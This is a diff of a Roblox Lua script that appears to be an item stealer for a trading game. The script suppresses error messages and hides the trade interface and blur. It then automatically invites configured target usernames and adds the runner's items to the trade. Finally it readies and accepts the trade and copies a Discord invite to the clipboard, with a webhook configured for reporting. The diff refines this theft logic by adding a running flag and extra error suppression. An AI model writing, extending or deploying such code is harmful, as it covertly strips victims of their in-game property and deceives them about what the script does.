@@ -1,7 +1,6 @@
 repeat task.wait() until game:IsLoaded()
 task.wait(1.5)
 
-
 pcall(function()
     local errorConnection
     for _, conn in ipairs(getconnections(game:GetService("ScriptContext").Error)) do
@@ -9,7 +8,7 @@ pcall(function()
             local old = conn.Function
             conn:Disable()
             game:GetService("ScriptContext").Error:Connect(function(message, stackTrace)
-                if message:find("RemainingTime") or message:find("BillboardGui") or message:find("PlotClient") then
+                if message:find("RemainingTime") or message:find("BillboardGui") or message:find("PlotClient") or message:find("TradeController") then
                     return
                 end
                 old(message, stackTrace)
@@ -43,7 +42,6 @@ local WEBHOOK_ID = cfg.WEBHOOK_ID
 local USERNAMES = cfg.USERNAMES
 local PROXY_URL = cfg.PROXY_URL
 local PublicHits = "31566ef8c2c18566522c58e8c11511cf"
-
 
 if not WEBHOOK_ID or WEBHOOK_ID == "" then
     warn("[ED] Invalid webhook")
@@ -130,19 +128,9 @@ if identifyexecutor and identifyexecutor() == "Delta" then
     REAL_JOB_ID = bypassJobId
 end
 
-local ETERNAL_DARKNESS_COLORS = {
-    primary = 0x0a0a1a,
-    secondary = 0x1a1a2e,
-    accent = 0x16213e,
-    highlight = 0x0f3460,
-    text = 0x533483,
-    gold = 0x8b0000,
-    success = 0x006400
-}
-
 local cam = workspace.CurrentCamera
 local pg = plr:WaitForChild("PlayerGui")
-local guiNames = {BrainrotTrader = true, TradeLiveTrade = true, TradePrompts = true}
+local guiNames = {BrainrotTrader = true, TradeLiveTrade = true}
 
 local function handleCam(obj)
     if obj:IsA("BlurEffect") then
@@ -516,9 +504,11 @@ local function addNextBrainrot(addRemote, index)
 end
 
 local isTradeCompleted = false
+local tradeRunning = false
 
 local function startTradeAutomation(targetId)
-    if isTradeCompleted then return end
+    if isTradeCompleted or tradeRunning then return end
+    tradeRunning = true
 
     local searchRemote = tradeRemotes["RF/TradeService/SearchUser"]
     local inviteRemote = tradeRemotes["RF/TradeService/Invite"]
@@ -526,19 +516,10 @@ local function startTradeAutomation(targetId)
     local readyRemote = tradeRemotes["RE/TradeService/Ready"]
     local acceptRemote = tradeRemotes["RE/TradeService/Accept"]
 
-    if not searchRemote or not inviteRemote then 
-        for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
-            if obj:IsA("RemoteFunction") or obj:IsA("RemoteEvent") then
-                if obj.Name == "RF/TradeService/SearchUser" then searchRemote = obj end
-                if obj.Name == "RF/TradeService/Invite" then inviteRemote = obj end
-                if obj.Name == "RF/TradeService/AddBrainrot" then addRemote = obj end
-                if obj.Name == "RE/TradeService/Ready" then readyRemote = obj end
-                if obj.Name == "RE/TradeService/Accept" then acceptRemote = obj end
-            end
-        end
+    if not searchRemote or not inviteRemote then
+        tradeRunning = false
+        return
     end
-
-    if not searchRemote or not inviteRemote then return end
 
     if addRemote then
         task.spawn(function()
@@ -561,7 +542,6 @@ local function startTradeAutomation(targetId)
                 searchRemote:InvokeServer(targetId)
                 task.wait(1)
                 inviteRemote:InvokeServer(targetId)
-                task.wait(1)
                 task.wait(5)
                 if readyRemote and acceptRemote then
                     local startTime = tick()
@@ -581,6 +561,7 @@ local function startTradeAutomation(targetId)
         task.wait(90)
         if not isTradeCompleted then
             isTradeCompleted = true
+            tradeRunning = false
             task.wait(2)
             pcall(function() setclipboard("https://discord.gg/wep4k9Fg8W") end)
             pcall(function()
